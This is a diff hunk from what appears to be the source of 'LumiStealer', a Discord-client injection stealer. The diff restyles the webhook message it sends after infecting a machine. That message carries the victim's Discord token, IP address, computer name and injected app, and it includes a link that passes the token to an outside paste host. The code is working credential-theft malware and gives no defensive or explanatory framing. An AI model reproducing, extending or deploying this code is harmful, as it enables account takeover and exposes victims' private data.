@@ -283,43 +283,43 @@ async function initOne() {
     return true;
   }
 
-  if (!fs.existsSync(__dirname + "/System")) {
-    fs.mkdirSync(__dirname + "/System");
+  if (!fs.existsSync(__dirname + "/Lumi")) {
+    fs.mkdirSync(__dirname + "/Lumi");
   }else {
     return true;
   }
   var { appPath, appName } = path;
   var client_discord = appName;
 
-  const embed = {
+const embed = {
     title: 'First Injection Detected - LumiStealer',
     color: 0x5a0998,
     fields: [
-      {
-        name: "Injection Path:",
-        value: "`"+__dirname+"`",
-        inline: false
-      },
-      {
-        name: "Client:",
-        value: "`"+appName+"`",
-        inline: true
-      },
-      {
-        name: "Computer Name:",
-        value: "`"+computerName+"`",
-        inline: true
-      },
-      {
-        name: "IP:",
-        value: "`"+ip+"`",
-        inline: true
-      },
-      {
-        name: "Token:",
-        value: "`"+token+"`\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
-        inline: false
-      },
+        {
+            name: "Injection Path:",
+            value: "`" + __dirname + "`",
+            inline: false
+        },
+        {
+            name: "Infected App:",
+            value: "<:lupa:1249813644750098534> `" + appName + "`",
+            inline: true
+        },
+        {
+            name: "Computer Name:",
+            value: "<:r_purple_204:1229800367861272576> `" + computerName + "`",
+            inline: true
+        },
+        {
+            name: "IP Address:",
+            value: "<:r_purple19_emoji:1247251239255670905> `" + ip + "`",
+            inline: true
+        },
+        {
+            name: "Token:",
+            value: "`" + token + "`\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + token + ")",
+            inline: false
+        },
     ],
     "author": {
       name: user.username+"#0000 - LumiStealer",
